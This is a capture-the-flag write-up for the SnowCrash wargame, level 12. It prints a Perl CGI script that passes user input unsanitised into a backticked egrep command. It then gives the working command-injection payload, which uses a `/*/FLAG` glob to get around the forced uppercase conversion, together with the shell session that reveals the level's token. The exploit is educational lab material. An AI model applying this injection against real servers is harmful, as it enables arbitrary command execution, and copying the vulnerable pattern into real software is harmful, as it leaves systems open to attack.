we find the perl file in the folder
```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

obviously we can exploit `egrep "^$xx"` while considering the regex contraints:
```bash
cat > /tmp/FLAG <<'EOF'
#!/bin/sh
getflag >/tmp/flag12
EOF
chmod +x /tmp/FLAG
```

```
level12@SnowCrash:~$ cat > /tmp/FLAG <<'EOF'
> #!/bin/sh
> getflag >/tmp/flag12
> EOF
level12@SnowCrash:~$ chmod +x /tmp/FLAG
level12@SnowCrash:~$ curl localhost:4646?x='`/*/FLAG`'
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```